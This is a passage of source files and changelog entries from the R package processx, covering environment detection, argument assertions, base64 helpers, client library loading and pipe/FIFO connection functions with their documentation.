* `run()` now includes the standard error in the condition signalled on
  interrupt.

* `process` now supports creating pseudo terminals on Unix systems.

* `conn_create_pipepair()` gets new argument to set the pipes as blocking
  or non-blocking.

* `process` does not set the inherited extra connections as blocking,
  and it also does not close them after starting the subprocess.
  This is now the responsibility of the user. Note that this is a
  breaking change.

* `run()` now passes extra `...` arguments to `process$new()`.

* `run()` now does not error if the process is killed in a callback.

# processx 3.3.1

* Fix a crash on Windows, when a connection that has a pending read
  internally is finalized.

# processx 3.3.0

* `process` can now redirect the standard error to the standard output, via
  specifying `stderr = "2>&1"`. This works both with files and pipes.

* `run()` can now redirect the standard error to the standard output, via
  the new `stderr_to_stdout` argument.

* The `$kill()` and `$kill_tree()` methods get a `close_connection = TRUE`
  argument that closes all pipe connections of the process.

* `run()` now always kills the process (and its process tree if
  `cleanup_tree` is `TRUE`) before exiting. This also closes all
  pipe connections (#149).

# processx 3.2.1

* processx does not depend on assertthat now, and the crayon package
  is now an optional dependency.

# processx 3.2.0

* New `process$kill_tree()` method, and new `cleanup_tree` arguments in
  `run()` and `process$new()`, to clean up the process tree rooted at a
  processx process. (#139, #143).

* New `process$interupt()` method to send an interrupt to a process,
  SIGINT on Unix, CTRL+C on Windows (#127).

* New `stdin` argument in `process$new()` to support writing to the
  standard input of a process (#27, #114).

* New `connections` argument in `process$new()` to support passing extra
  connections to the child process, in addition to the standard streams.

* New `poll_connection` argument to `process$new()`, an extra connection
  that can be used to poll the process, even if `stdout` and `stderr` are
  not pipes (#125).

* `poll()` now works with connections objects, and they can be mixed with
  process objects (#121).

* New `env` argument in `run()` and `process$new()`, to set the
  environment of the child process, optionally (#117, #118).

* Removed the `$restart()` method, because it was less useful than
  expected, and hard to maintain (#116).

* New `conn_set_stdout()` and `conn_set_stderr()` to set the standard
  output or error of the calling process.

* New `conn_disable_inheritance()` to disable stdio inheritance. It is
  suggested that child processes call this immediately after starting, so
  the file handles are not inherited further.

* Fixed a signal handler bug on Unix that marked the process as finished,
  even if it has not (d221aa1f).

* Fixed a bug that occasionally caused crashes in `wait()`, on Unix (#138).

* When `run()` is interrupted, no error message is printed, just like
  for interruption of R code in general. The thrown condition now also
  has the `interrupt` class (#148).

# processx 3.1.0

* Fix interference with the parallel package, and other packages that
  redefine the `SIGCHLD` signal handler on Unix. If the processx signal
  handler is overwritten, we might miss the exit status of some processes
  (they are set to `NA`).

* `run()` and `process$new()` allow specifying the working directory
  of the process (#63).

* Make the debugme package an optional dependency (#74).

* processx is now compatible with R 3.1.x.

* Allow polling more than 64 connections on Windows, by using IOCP
  instead of `WaitForMultipleObjects()` (#81, #106).

* Fix a race condition on Windows, when creating named pipes for stdout
  or stderr. The client sometimes didn't wait for the server, and processx
  failed with ERROR_PIPE_BUSY (231, All pipe instances are busy).

# processx 3.0.3

* Fix a crash on windows when trying to run a non-existing command (#90)

* Fix a race condition in `process$restart()`

* `run()` and `process$new()` do not support the `commandline` argument
  any more, because process cleanup is error prone with an intermediate
  shell. (#88)

* `processx` process objects no longer use R connection objects,
  because the R connection API was retroactive made private by R-core
  `processx` uses its own connection class now to manage standard output
  and error of the process.

* The encoding of the standard output and error can be specified now,
  and `processx` re-encodes `stdout` and `stderr` in UTF-8.

* Cloning of process objects is disables now, as it is likely that it
  causes problems (@wch).

* `supervise` option to kill child process if R crashes (@wch).

* Add `get_output_file` and `get_error_file`, `has_output_connection()`
  and `has_error_connection()` methods (@wch).

* `stdout` and `stderr` default to `NULL` now, i.e. they are
  discarded (@wch).

* Fix undefined behavior when stdout/stderr was read out after the
  process was already finalized, on Unix.

* `run()`: Better message on interruption, kill process when interrupted.

* Unix: better kill count on unloading the package.

* Unix: make wait() work when SIGCHLD is not delivered for some reason.

* Unix: close inherited file descriptors more conservatively.

* Fix a race condition and several memory leaks on Windows.

* Fixes when running under job control that does not allow breaking away
  from the job, on Windows.

# processx 2.0.0.1

This is an unofficial release, created by CRAN, to fix compilation on
Solaris.

# processx 2.0.0

First public release.
````

### `px390/processx/R/aaa-import-standalone-rstudio-detect.R`

````r
# Standalone file: do not edit by hand
# Source: <https://github.com/r-lib/cli/blob/main/R/aaa-standalone-rstudio-detect.R>
# ----------------------------------------------------------------------
#
# ---
# repo: r-lib/cli
# file: aaa-standalone-rstudio-detect.R
# last-updated: 2022-05-31
# license: https://unlicense.org
# ---

rstudio <- local({
  standalone_env <- environment()
  parent.env(standalone_env) <- baseenv()

  # -- Collect data ------------------------------------------------------

  data <- NULL

  get_data <- function() {
    envs <- c(
      "R_BROWSER",
      "R_PDFVIEWER",
      "RSTUDIO",
      "RSTUDIO_TERM",
      "RSTUDIO_CLI_HYPERLINKS",
      "RSTUDIO_CONSOLE_COLOR",
      "RSTUDIOAPI_IPC_REQUESTS_FILE",
      "XPC_SERVICE_NAME",
      "ASCIICAST"
    )

    d <- list(
      pid = Sys.getpid(),
      envs = Sys.getenv(envs),
      api = tryCatch(
        asNamespace("rstudioapi")$isAvailable(),
        error = function(err) FALSE
      ),
      tty = isatty(stdin()),
      gui = .Platform$GUI,
      args = commandArgs(),
      search = search()
    )
    d$ver <- if (d$api) asNamespace("rstudioapi")$getVersion()
    d$desktop <- if (d$api) asNamespace("rstudioapi")$versionInfo()$mode

    d
  }

  # -- Auto-detect environment -------------------------------------------

  is_rstudio <- function() {
    Sys.getenv("RSTUDIO") == "1"
  }

  detect <- function(clear_cache = FALSE) {
    # Check this up front, in case we are in a testthat 3e test block.
    # We cannot cache this, because we might be in RStudio in reality.
    if (!is_rstudio()) {
      return(get_caps(type = "not_rstudio"))
    }

    # Cached?
    if (clear_cache) {
      data <<- NULL
    }
    if (!is.null(data)) {
      return(get_caps(data))
    }

    if (
      (rspid <- Sys.getenv("RSTUDIO_SESSION_PID")) != "" &&
        any(c("ps", "cli") %in% loadedNamespaces())
    ) {
      detect_new(rspid, clear_cache)
    } else {
      detect_old(clear_cache)
    }
  }

  get_parentpid <- function() {
    if ("cli" %in% loadedNamespaces()) {
      asNamespace("cli")$get_ppid()
    } else {
      ps::ps_ppid()
    }
  }

  detect_new <- function(rspid, clear_cache) {
    mypid <- Sys.getpid()

    new <- get_data()

    if (mypid == rspid) {
      return(get_caps(new, type = "rstudio_console"))
    }

    # need explicit namespace reference because we mess up the environment
    parentpid <- get_parentpid()
    pane <- Sys.getenv("RSTUDIO_CHILD_PROCESS_PANE")

    # this should not happen, but be defensive and fall back
    if (pane == "") {
      return(detect_old(clear_cache))
    }

    # direct subprocess
    new$type <- if (rspid == parentpid) {
      if (pane == "job") {
        "rstudio_job"
      } else if (pane == "build") {
        "rstudio_build_pane"
      } else if (pane == "render") {
        "rstudio_render_pane"
      } else if (
        pane == "terminal" && new$tty && new$envs["ASCIICAST"] != "true"
      ) {
        # not possible, because there is a shell in between, just in case
        "rstudio_terminal"
      } else {
        # don't know what kind of direct subprocess
        "rstudio_subprocess"
      }
    } else if (
      pane == "terminal" && new$tty && new$envs[["ASCIICAST"]] != "true"
    ) {
      # not a direct subproces, so check other criteria as well
      "rstudio_terminal"
    } else {
      # don't know what kind of subprocess
      "rstudio_subprocess"
    }

    get_caps(new)
  }

  detect_old <- function(clear_cache = FALSE) {
    # Cache unless told otherwise
    cache <- TRUE
    new <- get_data()

    new$type <- if (new$envs[["RSTUDIO"]] != "1") {
      # 1. Not RStudio at all
      "not_rstudio"
    } else if (new$gui == "RStudio" && new$api) {
      # 2. RStudio console, properly initialized
      "rstudio_console"
    } else if (!new$api && basename(new$args[1]) == "RStudio") {
      # 3. RStudio console, initializing
      cache <- FALSE
      "rstudio_console_starting"
    } else if (new$gui == "Rgui") {
      # Still not RStudio, but Rgui that was started from RStudio
      "not_rstudio"
    } else if (new$tty && new$envs[["ASCIICAST"]] != "true") {
      # 4. R in the RStudio terminal
      # This could also be a subprocess of the console or build pane
      # with a pseudo-terminal. There isn't really a way to rule that
      # out, without inspecting some process data with ps::ps_*().
      # At least we rule out asciicast
      "rstudio_terminal"
    } else if (
      !new$tty &&
        new$envs[["RSTUDIO_TERM"]] == "" &&
        new$envs[["R_BROWSER"]] == "false" &&
        new$envs[["R_PDFVIEWER"]] == "false" &&
        is_build_pane_command(new$args)
    ) {
      # 5. R in the RStudio build pane
      # https://github.com/rstudio/rstudio/blob/master/src/cpp/session/
      # modules/build/SessionBuild.cpp#L231-L240
      "rstudio_build_pane"
    } else if (
      new$envs[["RSTUDIOAPI_IPC_REQUESTS_FILE"]] != "" &&
        grepl("rstudio", new$envs[["XPC_SERVICE_NAME"]])
    ) {
      # RStudio job, XPC_SERVICE_NAME=0 in the subprocess of a job
      # process. Hopefully this is reliable.
      "rstudio_job"
    } else if (
      new$envs[["RSTUDIOAPI_IPC_REQUESTS_FILE"]] != "" &&
        any(grepl("SourceWithProgress.R", new$args))
    ) {
      # Or we can check SourceWithProgress.R in the command line, see
      # https://github.com/r-lib/cli/issues/367
      "rstudio_job"
    } else {
      # Otherwise it is a subprocess of the console, terminal or
      # build pane, and it is hard to say which, so we do not try.
      "rstudio_subprocess"
    }

    installing <- Sys.getenv("R_PACKAGE_DIR", "")
    if (cache && installing == "") {
      data <<- new
    }

    get_caps(new)
  }

  is_build_pane_command <- function(args) {
    cmd <- gsub("[\"']", "", args[[length(args)]], useBytes = TRUE)
    calls <- c(
      "devtools::build",
      "devtools::test",
      "devtools::check",
      "testthat::test_file"
    )
    any(vapply(calls, grepl, logical(1), cmd))
  }

  # -- Capabilities ------------------------------------------------------

  caps <- list()

  caps$not_rstudio <- function(data) {
    list(
      type = "not_rstudio",
      dynamic_tty = FALSE,
      ansi_tty = FALSE,
      ansi_color = FALSE,
      num_colors = 1L,
      hyperlink = FALSE
    )
  }

  caps$rstudio_console <- function(data) {
    list(
      type = "rstudio_console",
      dynamic_tty = TRUE,
      ansi_tty = FALSE,
      ansi_color = data$envs[["RSTUDIO_CONSOLE_COLOR"]] != "",
      num_colors = as.integer(data$envs[["RSTUDIO_CONSOLE_COLOR"]]),
      hyperlink = data$envs[["RSTUDIO_CLI_HYPERLINKS"]] != ""
    )
  }

  caps$rstudio_console_starting <- function(data) {
    res <- caps$rstudio_console(data)
    res$type <- "rstudio_console_starting"
    res
  }

  caps$rstudio_terminal <- function(data) {
    list(
      type = "rstudio_terminal",
      dynamic_tty = TRUE,
      ansi_tty = FALSE,
      ansi_color = FALSE,
      num_colors = 1L,
      hyperlink = FALSE
    )
  }

  caps$rstudio_build_pane <- function(data) {
    list(
      type = "rstudio_build_pane",
      dynamic_tty = TRUE,
      ansi_tty = FALSE,
      ansi_color = data$envs[["RSTUDIO_CONSOLE_COLOR"]] != "",
      num_colors = as.integer(data$envs[["RSTUDIO_CONSOLE_COLOR"]]),
      hyperlink = data$envs[["RSTUDIO_CLI_HYPERLINKS"]] != ""
    )
  }

  caps$rstudio_job <- function(data) {
    list(
      type = "rstudio_job",
      dynamic_tty = FALSE,
      ansi_tty = FALSE,
      ansi_color = data$envs[["RSTUDIO_CONSOLE_COLOR"]] != "",
      num_colors = as.integer(data$envs[["RSTUDIO_CONSOLE_COLOR"]]),
      hyperlink = data$envs[["RSTUDIO_CLI_HYPERLINKS"]] != ""
    )
  }

  caps$rstudio_render_pane <- function(data) {
    list(
      type = "rstudio_render_pane",
      dynamic_tty = TRUE,
      ansi_tty = FALSE,
      ansi_color = FALSE,
      num_colors = 1L,
      hyperlink = data$envs[["RSTUDIO_CLI_HYPERLINKS"]] != ""
    )
  }

  caps$rstudio_subprocess <- function(data) {
    list(
      type = "rstudio_subprocess",
      dynamic_tty = FALSE,
      ansi_tty = FALSE,
      ansi_color = FALSE,
      num_colors = 1L,
      hyperlink = FALSE
    )
  }

  get_caps <- function(data, type = data$type) caps[[type]](data)

  structure(
    list(
      .internal = standalone_env,
      is_rstudio = is_rstudio,
      detect = detect
    ),
    class = c("standalone_rstudio_detect", "standalone")
  )
})
````

### `px390/processx/R/aaassertthat.R`

````r
assert_that <- function(..., env = parent.frame(), msg = NULL) {
  res <- see_if(..., env = env, msg = msg)
  if (res) {
    return(TRUE)
  }

  throw(new_assert_error(attr(res, "msg")))
}

new_assert_error <- function(message, call = NULL) {
  cond <- new_error(message, call. = call)
  class(cond) <- c("assert_error", class(cond))
  cond
}

see_if <- function(..., env = parent.frame(), msg = NULL) {
  asserts <- eval(substitute(alist(...)))

  for (assertion in asserts) {
    res <- tryCatch(
      {
        eval(assertion, env)
      },
      new_assert_error = function(e) {
        structure(FALSE, msg = e$message)
      }
    )
    check_result(res)

    # Failed, so figure out message to produce
    if (!res) {
      if (is.null(msg)) {
        msg <- get_message(res, assertion, env)
      }
      return(structure(FALSE, msg = msg))
    }
  }

  res
}

check_result <- function(x) {
  if (!is.logical(x)) {
    throw(new_assert_error(
      "assert_that: assertion must return a logical value"
    ))
  }
  if (any(is.na(x))) {
    throw(new_assert_error("assert_that: missing values present in assertion"))
  }
  if (length(x) != 1) {
    throw(new_assert_error("assert_that: length of assertion is not 1"))
  }

  TRUE
}

get_message <- function(res, call, env = parent.frame()) {
  stopifnot(is.call(call), length(call) >= 1)

  if (has_attr(res, "msg")) {
    return(attr(res, "msg"))
  }

  f <- eval(call[[1]], env)
  if (!is.primitive(f)) {
    call <- match.call(f, call)
  }
  fname <- deparse(call[[1]])

  fail <- on_failure(f) %||% base_fs[[fname]] %||% fail_default
  fail(call, env)
}

# The default failure message works in the same way as stopifnot, so you can
# continue to use any function that returns a logical value: you just won't
# get a friendly error message.
# The code below says you get the first 60 characters plus a ...
fail_default <- function(call, env) {
  call_string <- deparse(call, width.cutoff = 60L)
  if (length(call_string) > 1L) {
    call_string <- paste0(call_string[1L], "...")
  }

  paste0(call_string, " is not TRUE")
}

on_failure <- function(x) attr(x, "fail")

"on_failure<-" <- function(x, value) {
  stopifnot(is.function(x), identical(names(formals(value)), c("call", "env")))
  attr(x, "fail") <- value
  x
}

has_attr <- function(x, which) !is.null(attr(x, which, exact = TRUE))
on_failure(has_attr) <- function(call, env) {
  paste0(deparse(call$x), " does not have attribute ", eval(call$which, env))
}
"%has_attr%" <- has_attr

base_fs <- new.env(parent = emptyenv())
````

### `px390/processx/R/assertions.R`

````r
is_string <- function(x) {
  is.character(x) &&
    length(x) == 1 &&
    !is.na(x)
}

on_failure(is_string) <- function(call, env) {
  paste0(deparse(call$x), " is not a string (length 1 character)")
}

is_string_or_null <- function(x) {
  is.null(x) || is_string(x)
}

on_failure(is_string_or_null) <- function(call, env) {
  paste0(deparse(call$x), " must be a string (length 1 character) or NULL")
}

is_flag <- function(x) {
  is.logical(x) &&
    length(x) == 1 &&
    !is.na(x)
}

on_failure(is_flag) <- function(call, env) {
  paste0(deparse(call$x), " is not a flag (length 1 logical)")
}

is_integerish_scalar <- function(x) {
  is.numeric(x) && length(x) == 1 && !is.na(x) && round(x) == x
}

on_failure(is_integerish_scalar) <- function(call, env) {
  paste0(deparse(call$x), " is not a length 1 integer")
}

is_pid <- function(x) {
  is.numeric(x) && length(x) == 1 && !is.na(x) && round(x) == x
}

on_failure(is_pid) <- function(call, env) {
  paste0(deparse(call$x), " is not a process id (length 1 integer)")
}

is_flag_or_string <- function(x) {
  is_string(x) || is_flag(x)
}

on_failure(is_flag_or_string) <- function(call, env) {
  paste0(deparse(call$x), " is not a flag or a string")
}

is_existing_file <- function(x) {
  is_string(x) && file.exists(x)
}

on_failure(is_existing_file) <- function(call, env) {
  paste0("File ", deparse(call$x), " does not exist")
}

is_time_interval <- function(x) {
  (inherits(x, "difftime") && length(x) == 1) ||
    (is.numeric(x) && length(x) == 1 && !is.na(x))
}

on_failure(is_time_interval) <- function(call, env) {
  paste0(deparse(call$x), " is not a valid time interval")
}

is_list_of_pollables <- function(x) {
  if (!is.list(x)) {
    return(FALSE)
  }
  proc <- vapply(x, inherits, FUN.VALUE = logical(1), "process")
  conn <- vapply(x, is_connection, logical(1))
  curl <- vapply(x, inherits, FUN.VALUE = logical(1), "processx_curl_fds")
  all(proc | conn | curl)
}

on_failure(is_list_of_pollables) <- function(call, env) {
  paste0(deparse(call$x), " is not a list of pollable objects")
}

is_named_character <- function(x) {
  is.character(x) && !any(is.na(x)) && is_named(x)
}

on_failure(is_named_character) <- function(call, env) {
  paste0(deparse(call$x), " must be a named character vector")
}

is_named <- function(x) {
  length(names(x)) == length(x) && all(names(x) != "")
}

on_failure(is_named) <- function(call, env) {
  paste0(deparse(call$x), " must have non-empty names")
}

is_connection <- function(x) {
  inherits(x, "processx_connection")
}

on_failure(is_connection) <- function(call, env) {
  paste0(deparse(call$x), " must be a processx connection")
}

is_connection_list <- function(x) {
  all(vapply(x, is_connection, logical(1)))
}

on_failure(is_connection_list) <- function(call, env) {
  paste0(deparse(call$x), " must be a list of processx connections")
}

is_env_vector <- function(x) {
  if (is_named_character(x)) {
    return(TRUE)
  }
  if (!is.character(x) || anyNA(x)) {
    return(FALSE)
  }
  if (is.null(names(x))) {
    all(x == "current")
  } else {
    all(x[names(x) == ""] == "current")
  }
}

on_failure(is_env_vector) <- function(call, env) {
  paste0(
    "all elements, except \"current\" must be named in ",
    deparse(call$x)
  )
}

is_pdeathsig <- function(x) {
  isFALSE(x) ||
    isTRUE(x) ||
    (is.numeric(x) && length(x) == 1 && !is.na(x) && round(x) == x && x > 0)
}

on_failure(is_pdeathsig) <- function(call, env) {
  paste0(
    deparse(call$x),
    " must be FALSE, TRUE, or a positive integer signal number"
  )
}

is_std_conn <- function(x) {
  is.null(x) || is_string(x) || is_connection(x)
}

on_failure(is_std_conn) <- function(call, env) {
  paste0(
    deparse(call$x),
    " must be `NULL`, a string or a processx connection"
  )
}
````

### `px390/processx/R/base64.R`

````r
#' Base64 Encoding and Decoding
#'
#' @param x Raw vector to encode / decode.
#' @return Raw vector, result of the encoding / decoding.
#'
#' @export

base64_decode <- function(x) {
  if (is.character(x)) {
    x <- charToRaw(paste(gsub("\\s+", "", x), collapse = ""))
  }
  chain_call(c_processx_base64_decode, x)
}

#' @export
#' @rdname base64_decode

base64_encode <- function(x) {
  rawToChar(chain_call(c_processx_base64_encode, x))
}
````

### `px390/processx/R/cleancall.R`

````r
call_with_cleanup <- function(ptr, ...) {
  .Call(c_cleancall_call, pairlist(ptr, ...), parent.frame())
}
````

### `px390/processx/R/client-lib.R`

````r
client <- new.env(parent = emptyenv())

local({
  ext <- .Platform$dynlib.ext
  arch <- .Platform$r_arch
  safe_md5sum <- function(path) {
    stopifnot(length(path) == 1)
    tryCatch(
      tools::md5sum(path),
      error = function(err) {
        tmp <- tempfile()
        on.exit(unlink(tmp, force = TRUE, recursive = TRUE), add = TRUE)
        file.copy(path, tmp)
        structure(tools::md5sum(tmp), names = path)
      }
    )
  }
  read_all <- function(x) {
    list(
      bytes = readBin(x, "raw", file.size(x)),
      md5 = unname(safe_md5sum(x)) # absolute file name <> stated install
    )
  }
  libs <- system.file("libs", package = "processx")
  if (!file.exists(libs)) {
    # devtools
    single <- system.file("src", paste0("client", ext), package = "processx")
    client[[paste0("arch-", arch)]] <- read_all(single)
  } else {
    # not devtools
    single <- file.path(libs, paste0("client", ext))
    if (file.exists(single)) {
      # not multiarch
      bts <- file.size(single)
      client[[paste0("arch-", arch)]] <- read_all(single)
    } else {
      # multiarch
      multi <- dir(libs)
      for (aa in multi) {
        fn <- file.path(libs, aa, paste0("client", ext))
        client[[paste0("arch-", aa)]] <- read_all(fn)
      }
    }
  }
})

# This is really only here for testing

load_client_lib <- function(client) {
  ext <- .Platform$dynlib.ext
  arch <- paste0("arch-", .Platform$r_arch)
  tmpsofile <- tempfile(fileext = ext)
  writeBin(client[[arch]]$bytes, tmpsofile)
  tmpsofile <- normalizePath(tmpsofile)

  lib <- dyn.load(tmpsofile)
  on.exit(dyn.unload(tmpsofile))

  sym_encode <- getNativeSymbolInfo("processx_base64_encode", lib)
  sym_decode <- getNativeSymbolInfo("processx_base64_decode", lib)
  sym_disinh <- getNativeSymbolInfo("processx_disable_inheritance", lib)
  sym_write <- getNativeSymbolInfo("processx_write", lib)
  sym_setout <- getNativeSymbolInfo("processx_set_stdout", lib)
  sym_seterr <- getNativeSymbolInfo("processx_set_stderr", lib)
  sym_setoutf <- getNativeSymbolInfo("processx_set_stdout_to_file", lib)
  sym_seterrf <- getNativeSymbolInfo("processx_set_stderr_to_file", lib)

  env <- new.env(parent = emptyenv())
  env$.path <- tmpsofile

  mycall <- .Call

  env$base64_encode <- function(x) rawToChar(mycall(sym_encode, x))
  env$base64_decode <- function(x) {
    if (is.character(x)) {
      x <- charToRaw(paste(gsub("\\s+", "", x), collapse = ""))
    }
    mycall(sym_decode, x)
  }

  env$disable_fd_inheritance <- function() mycall(sym_disinh)

  env$write_fd <- function(fd, data) {
    if (is.character(data)) {
      data <- charToRaw(paste0(data, collapse = ""))
    }
    len <- length(data)
    repeat {
      written <- mycall(sym_write, fd, data)
      len <- len - written
      if (len == 0) {
        break
      }
      if (written) {
        data <- data[-(1:written)]
      }
      Sys.sleep(.1)
    }
  }

  env$set_stdout <- function(fd, drop = TRUE) {
    mycall(sym_setout, as.integer(fd), as.logical(drop))
  }

  env$set_stderr <- function(fd, drop = TRUE) {
    mycall(sym_seterr, as.integer(fd), as.logical(drop))
  }

  env$set_stdout_file <- function(path) {
    mycall(sym_setoutf, as.character(path)[1])
  }

  env$set_stderr_file <- function(path) {
    mycall(sym_seterrf, as.character(path)[1])
  }

  env$.finalize <- function() {
    dyn.unload(env$.path)
    rm(list = ls(env, all.names = TRUE), envir = env)
  }

  penv <- environment()
  parent.env(penv) <- baseenv()

  reg.finalizer(
    env,
    function(e) if (".finalize" %in% names(e)) e$.finalize(),
    onexit = TRUE
  )

  ## Clear the cleanup method
  on.exit(NULL)
  env
}

environment(load_client_lib) <- baseenv()
````

### `px390/processx/R/connections.R`

````r
#' Processx connections
#'
#' These functions are currently experimental and will change
#' in the future. Note that processx connections are  _not_
#' compatible with R's built-in connection system.
#'
#' `conn_create_fd()` creates a connection from a file descriptor.
#'
#' @param fd Integer scalar, a Unix file descriptor.
#' @param encoding Encoding of the readable connection when reading.
#' @param close Whether to close the OS file descriptor when closing
#'   the connection. Sometimes you want to leave it open, and use it again
#'   in a `conn_create_fd` call.
#' Encoding to re-encode `str` into when writing.
#'
#' @family processx connections
#' @rdname processx_connections
#' @export

conn_create_fd <- function(fd, encoding = "", close = TRUE) {
  assert_that(
    is_integerish_scalar(fd),
    is_string(encoding),
    is_flag(close)
  )
  fd <- as.integer(fd)
  chain_call(c_processx_connection_create_fd, fd, encoding, close)
}

#' Processx FIFOs
#'
#' @description
#' `r lifecycle::badge("experimental")`
#'
#' Create a FIFO for inter-process communication
#' Note that these functions are currently experimental.
#'
#' @details
#' `conn_create_fifo()` creates a FIFO and connects to it.
#' On Unix this is a proper FIFO in the file system, in the R temporary
#' directory. On Windows it is a named pipe.
#'
#' Use [conn_file_name()] to query the name of the FIFO, and
#' `conn_connect_fifo()` to connect to the other end.
#'
#' # Notes
#'
#' ## In general Unix domain sockets work better than FIFOs, so we suggest
#' you use sockets if you can. See [conn_create_unix_socket()].
#'
#' ## Creating the read end of the FIFO
#'
#' This case is simpler. To wait for a writer to connect to the FIFO
#' you can use [poll()] as usual. Then use [conn_read_chars()] or
#' [conn_read_lines()] to read from the FIFO, as usual. Use
#' [conn_is_incomplete()] *after* a read to check if there is more data,
#' or the writer is done.
#'
#' ## Creating the write end of the FIFO
#'
#' This is somewhat trickier. Creating the (non-blocking) FIFO does not
#' block. However, there is no easy way to tell if a reader is connected
#' to the other end of the FIFO or not. On Unix you can start using
#' [conn_write()] to try to write to it, and this will succeed, until the
#' buffer gets full, even if there is no reader. (When the buffer is full
#' it will return the data that was not written, as usual.)
#'
#' On Windows, using [conn_write()] to write to a FIFO without a reader
#' fails with an error. This is not great, we are planning to improve it
#' later.
#'
#' Right now, one workaround for this behavior is for the reader to
#' connunicate to the writer process independenctly that it has connected
#' to the FIFO. (E.g. another FIFO in the opposite direction can do that.)
#'
#' @param filename File name of the FIFO. On Windows it the name of the
#' pipe within the `\\?\pipe\` namespace, either the full name, or the
#' part after that prefix. If `NULL`, then a random name
#' is used, on Unix in the R temporary directory: [base::tempdir()].
#' @param read If `TRUE` then connect to the read end of the FIFO.
#'   Exactly one of `read` and `write` must be set to `TRUE`.
#' @param write If `TRUE` then connect to the write end of the FIFO.
#'   Exactly one of `read` and `write` must be set to `TRUE`.
#' @param encoding Encoding to assume.
#' @param nonblocking Whether this should be a non-blocking FIFO.
#' Note that blocking FIFOs are not well tested and might not work well with
#' [poll()], especially on Windows. We might remove this option in the
#' future and make all FIFOs non-blocking.
#'
#' @seealso [processx internals](https://processx.r-lib.org/dev/articles/internals.html)
#'
#' @rdname processx_fifos
#' @export

conn_create_fifo <- function(
  filename = NULL,
  read = NULL,
  write = NULL,
  encoding = "",
  nonblocking = TRUE
) {
  if (is.null(read) && is.null(write)) {
    read <- TRUE
    write <- FALSE
  }
  if (is.null(read)) {
    read <- !write
  }
  if (is.null(write)) {
    write <- !read
  }

  if (read && write) {
    throw(new_error("Bi-directional FIFOs are not supported currently"))
  }

  assert_that(
    is_string_or_null(filename),
    is_flag(read),
    is_flag(write),
    read || write,
    !(read && write),
    is_string(encoding),
    is_flag(nonblocking)
  )

  filename <- make_pipe_file_name(filename)

  chain_call(
    c_processx_connection_create_fifo,
    read,
    write,
    filename,
    encoding,
    nonblocking
  )
}

winpipeprefix <- "\\\\?\\pipe\\"

make_pipe_file_name <- function(filename) {
  if (is_windows()) {
    filename <- filename %||% basename(tempfile())
    if (!starts_with(filename, winpipeprefix)) {
      filename <- paste0(winpipeprefix, filename)
    }
  } else {
    filename <- filename %||% tempfile()
  }
  filename
}

#' @details
#' `conn_connect_fifo()` connects to a FIFO created with
#' `conn_create_fifo()`, typically in another process. `filename` refers
#' to the name of the pipe on Windows.
#'
#' On Windows, `conn_connect_fifo()` may be successful even if the
#' FIFO does not exist, but then later `poll()` or read/write operations
#' will fail. We are planning on changing this behavior in the future,
#' to make `conn_connect_fifo()` fail immediately, like on Unix.
#'
#' @rdname processx_fifos
#' @export
#' @examples
#' # Example for a non-blocking FIFO
#'
#' # Need to open the reading end first, otherwise Unix fails
#' reader <- conn_create_fifo()
#'
#' # Always use poll() before you read, with a timeout if you like.
#' # If you read before the other end of the FIFO is connected, then
#' # the OS (or processx?) assumes that the FIFO is done, and you cannot
#' # read anything.
#' # Now poll() tells us that there is no data yet.
#' poll(list(reader), 0)
#'
#' writer <- conn_connect_fifo(conn_file_name(reader), write = TRUE)
#' conn_write(writer, "hello\nthere!\n")
#'
#' poll(list(reader), 1000)
#' conn_read_lines(reader, 1)
#' conn_read_chars(reader)
#'
#' conn_is_incomplete(reader)
#'
#' close(writer)
#' conn_read_chars(reader)
#' conn_is_incomplete(reader)
#'
#' close(reader)

conn_connect_fifo <- function(
  filename,
  read = NULL,
  write = NULL,
  encoding = "",
  nonblocking = TRUE
) {
  if (is.null(read) && is.null(write)) {
    read <- TRUE
    write <- FALSE
  }
  if (is.null(read)) {
    read <- !write
  }
  if (is.null(write)) {
    write <- !read
  }

  if (read && write) {
    throw(new_error("Bi-directional FIFOs are not supported currently"))
  }

  assert_that(
    is_string(filename),
    is_flag(read),
    is_flag(write),
    read || write,
    !(read && write),
    is_string(encoding),
    is_flag(nonblocking)
  )

  if (is_windows()) {
    if (!starts_with(filename, winpipeprefix)) {
      filename <- paste0(winpipeprefix, filename)
    }
  }

  chain_call(
    c_processx_connection_connect_fifo,
    filename,
    read,
    write,
    encoding,
    nonblocking
  )
}

#' @details
#' `conn_file_name()` returns the name of the file associated with the
#' connection. For connections that do not refer to a file in the file
#' system it returns `NA_character()`. Except for named pipes on Windows,
#' where it returns the full name of the pipe.
#'
#' @rdname processx_connections
#' @export

conn_file_name <- function(con) {
  assert_that(is_connection(con))

  chain_call(c_processx_connection_file_name, con)
}

#' @details
#' `conn_create_pipepair()` creates a pair of connected connections, the
#' first one is writeable, the second one is readable.
#'
#' @param nonblocking Whether the pipe should be non-blocking.
#' For `conn_create_pipepair()` it must be a logical vector of length two,
#' for both ends of the pipe.
#'
#' @rdname processx_connections
#' @export

conn_create_pipepair <- function(encoding = "", nonblocking = c(TRUE, FALSE)) {
  assert_that(
    is_string(encoding),
    is.logical(nonblocking),
    length(nonblocking) == 2,
    !any(is.na(nonblocking))
  )
  chain_call(c_processx_connection_create_pipepair, encoding, nonblocking)
}

#' @details
#' `conn_create_proc_pipepair()` creates a unidirectional pipe suitable for
#' connecting two child processes: the first element is the write end (pass as
#' `stdout` to the writing process) and the second is the read end (pass as
#' `stdin` to the reading process). Unlike `conn_create_pipepair()`, both ends
#' are synchronous (blocking), which is required for child-process stdin/stdout
#' on Windows.
#'
#' @rdname processx_connections
#' @export

conn_create_proc_pipepair <- function(encoding = "") {
  assert_that(is_string(encoding))
  chain_call(c_processx_connection_create_proc_pipepair, encoding)
}

#' @details
#' `conn_read_chars()` reads UTF-8 characters from the connections. If the
#' connection itself is not UTF-8 encoded, it re-encodes it.
#'
#' @param con Processx connection object.
#' @param n Number of characters or lines to read. -1 means all available
#' characters or lines.
#'
#' @rdname processx_connections
#' @export

conn_read_chars <- function(con, n = -1) UseMethod("conn_read_chars", con)

#' @rdname processx_connections
#' @export

conn_read_chars.processx_connection <- function(con, n = -1) {
  processx_conn_read_chars(con, n)
}

#' @rdname processx_connections
#' @export

processx_conn_read_chars <- function(con, n = -1) {
  assert_that(is_connection(con), is_integerish_scalar(n))
  chain_call(c_processx_connection_read_chars, con, n)
}

#' @details
#' `conn_read_bytes()` reads raw bytes from the connection into a raw vector.
#' Unlike `conn_read_chars()`, it bypasses UTF-8 conversion, so null bytes
#' and arbitrary binary data are preserved exactly. Calling this function
#' switches the connection permanently to raw mode; after that,
